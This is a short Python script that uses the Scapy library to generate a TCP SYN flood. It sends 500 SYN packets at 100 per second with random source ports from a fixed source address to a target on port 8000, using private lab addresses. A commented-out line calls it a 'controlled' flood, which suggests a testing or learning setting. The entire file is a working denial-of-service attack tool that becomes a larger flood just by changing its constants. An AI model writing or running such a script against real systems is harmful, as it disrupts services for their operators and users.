from scapy.all import IP, TCP, send
import random
import time


SOURCE_IP = "10.0.0.1"
TARGET_IP = "10.0.0.3"

TARGET_PORT = 8000


PACKET_COUNT = 500
PACKETS_PER_SECOND = 100

def syn_flood_generator ():


    delay = 1 / PACKETS_PER_SECOND

    #This below is just to confirm if it is working properly
    #print("Initiating controlled TCP SYN flood")
    #print(f"Source: {SOURCE_IP}")
    #print(f"Target: {TARGET_IP}:{TARGET_PORT}")
    #print(f"Packets: {PACKET_COUNT}")
    #print(f"Rate: {PACKETS_PER_SECOND} packets per second")

    for _ in range(PACKET_COUNT):

        source_port = random.randint(1024, 65535)

        packet = (
            IP(
                src=SOURCE_IP,
                dst=TARGET_IP
            )
            / TCP(
                sport = source_port,
                dport = TARGET_PORT,
                flags="S"
            )
        )

        send(packet, verbose=False)

        time.sleep(delay)

        print("Complete")

if __name__ == "__main__":
    syn_flood_generator()
